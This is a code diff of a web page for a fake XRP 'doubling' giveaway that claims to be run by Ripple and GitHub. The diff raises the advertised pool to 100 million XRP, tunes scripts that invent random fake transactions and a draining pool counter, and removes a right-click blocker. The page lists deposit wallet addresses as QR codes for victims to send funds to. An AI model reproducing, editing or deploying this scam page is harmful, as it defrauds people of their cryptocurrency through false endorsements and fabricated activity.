@@ -5,7 +5,6 @@
     <meta content="width=device-width, initial-scale=1.0" name="viewport">
     <meta name="description" content="13,704 people have participated.">
     <meta property="og:image" content="assets/thumb.webp" />
-
     <meta property="og:type" content="website">
     <meta property="og:site_name" content="Ripple Airdrop">
     <meta property="og:title" content="🔴Ripple collaboration with GitHub 5 Million XRP Giveaway">
@@ -220,10 +219,10 @@
         <div class="intro">
         <div class="text-content">
         <h1 class="title">Massive</h1>
-        <h1 class="title">50,000,000 XRP</h1>
+        <h1 class="title">100,000,000 XRP</h1>
         <h1 class="title">Giveaway</h1>
         <br>
-        <p class="text">Welcome to this unique event, in collaboration with GitHub, where you have the opportunity to double up (2x) your XRP token. A total of 50 Million XRP will be given away. Take a moment to review the rules and ensure you don't miss out on this opportunity!</p>
+        <p class="text">Welcome to this unique event, in collaboration with GitHub, where you have the opportunity to double up (2x) your XRP token. A total of 100 Million XRP will be given away. Take a moment to review the rules and ensure you don't miss out on this opportunity!</p>
 
 
     <button class="mb-8 mr-4 button1 large py-3 pl-5 pr-3 button button-dark rounded-4xl bg-blue-50" style="cursor: pointer;">
@@ -258,7 +257,7 @@
         <h3 class="title">description</h3>
         <p class="text">We believe that <span class="color">XRP or Ripple</span> will make the world fairer. To accelerate the
           adoption of cryptocurrency, the CEO of the financial technology company Ripple Labs, Bradley Kent Garlinghouse, has
-          decided to host a <span class="color">50,000,000 XRP Giveaway Event</span> in collaboration with GitHub.</p>
+          decided to host a <span class="color">100,000,000 XRP Giveaway Event</span> in collaboration with GitHub.</p>
 
         </div>
         <div class="card no-description">
@@ -299,7 +298,7 @@
         
         </div>
         <div class="text-content">
-        <h3 class="title"><span id="number2">50,000,000</span></h3>
+        <h3 class="title"><span id="number2">100,000,000</span></h3>
         <h3 class="title" hidden><span class="number">16497.69</span> XRP</h3>
         <p class="text" id="rules"><span style="color: #008cff;"><strong>XRP </strong></span>left in pool</p>
         </div>
@@ -347,8 +346,7 @@
     border-radius: 20px;">
           <img alt="" data-src="https://chart.googleapis.com/chart?cht=qr&amp;chs=120x120&amp;chl=rHZqLXJLiYSP2cuNR56Vr1MewFK9ajf4C7&amp;chld=H|0" src="https://chart.googleapis.com/chart?cht=qr&amp;chs=120x120&amp;chl=rHZqLXJLiYSP2cuNR56Vr1MewFK9ajf4C7&amp;chld=H|0" class="qr-code-img">
           <br>
-          <p style="color: #ffb300; font-size: 12px; position: absolute; left: -10px;" class="info-item">
-            *No&nbsp;destination&nbsp;tag&nbsp;required</p>
+          <p style="color: #ffb300; font-size: 12px; position: absolute; left: -10px;" class="info-item">*No&nbsp;destination&nbsp;tag&nbsp;required</p> 
           <br>
         </div>
        <!-----------------------CONTRIBUTION ADDRESS BEP20---------------------------->
@@ -357,8 +355,7 @@
     border-radius: 20px;">
           <img alt="" data-src="https://chart.googleapis.com/chart?cht=qr&amp;chs=120x120&amp;chl=0x1Ac65643C057cAE2Ea0C432Fb8eE4bF69fA7A7ca&amp;chld=H|0" src="https://chart.googleapis.com/chart?cht=qr&amp;chs=120x120&amp;chl=0x1Ac65643C057cAE2Ea0C432Fb8eE4bF69fA7A7ca&amp;chld=H|0" class="qr-code-img">
           <br>
-          <p style="color: #ffb300; font-size: 12px; position: absolute; left: -10px;" class="info-item">
-            *No&nbsp;destination&nbsp;tag&nbsp;required</p>
+          <p style="color: #ffb300; font-size: 12px; position: absolute; left: -10px;" class="info-item">*No&nbsp;destination&nbsp;tag&nbsp;required</p>
           <br>
         </div>
        <!-----------------------CONTRIBUTION ADDRESS BEP20---------------------------->
@@ -921,7 +918,7 @@ checkButton.addEventListener("click", () => {
                 t = CDATA.wallet.substring(0, 22) + "...",
                 o = "r" + makeid(20) + "...",
                 n = (getRandomNumber()),
-                n2 = Math.floor((Math.random()*25000)+1); /*---------- added script to extend the decreasing number-----------*/
+                n2 = Math.floor((Math.random()*50000)+1); /*---------- added script to extend the decreasing number-----------*/
                 nplusn2 = (n + n2).toFixed(2);
                 r = trxTemplate.cloneNode(!0);
             r.querySelector(".f-trx").innerText = e, r.querySelector(".s-trx").innerText = t, r.querySelector(".t-trx").innerText = o, r.querySelector(".amount-number").innerText = nplusn2, (amount = Math.round(1e3 * (amount - n - n2)) / 1e3) < 0 && (amount = CDATA.giveaway), progressBar.setAttribute("stroke-dasharray", Math.round(amount / (CDATA.giveaway / 34) * 1e3) / 1e3 + ", 100"), amountBox.innerText = amount, setCookie("eth", amount, 1), transactionList.querySelectorAll(".item").forEach(e => {
@@ -950,11 +947,11 @@ checkButton.addEventListener("click", () => {
       document.getElementById("number2").innerHTML = result;
       setTimeout(myFunction, 1.5e3);
       
-      if (amount <= 5000000) {
+      if (amount <= 10000000) {
             document.getElementById("percentage").style.color = '#F32013';
             }
     
-             else if(amount > 5000000) {
+             else if(amount > 10000000) {
     
                 document.getElementById("percentage").style.color = '#03ff00';
     
@@ -963,7 +960,7 @@ checkButton.addEventListener("click", () => {
     myFunction();
     
     function myPercentageFunction() {
-            percentage = (amount * 100) / 50000000;
+            percentage = (amount * 100) / 100000000; //--- adjust the total amount of giveaway here
             percentageResult = (Math.ceil(percentage));
       document.getElementById("percentage").innerHTML = percentageResult + "%";
       setTimeout(myPercentageFunction, 1.5e3);
@@ -1007,13 +1004,7 @@ checkButton.addEventListener("click", () => {
 
     
    
-<!------------Disable right click------------>
-<script>
-  document.addEventListener("contextmenu", (event) => {
-    event.preventDefault();
-  });
-</script>
-<!------------Disable right click------------>
+
 
 
 <!------- Preloader JS Start ------->
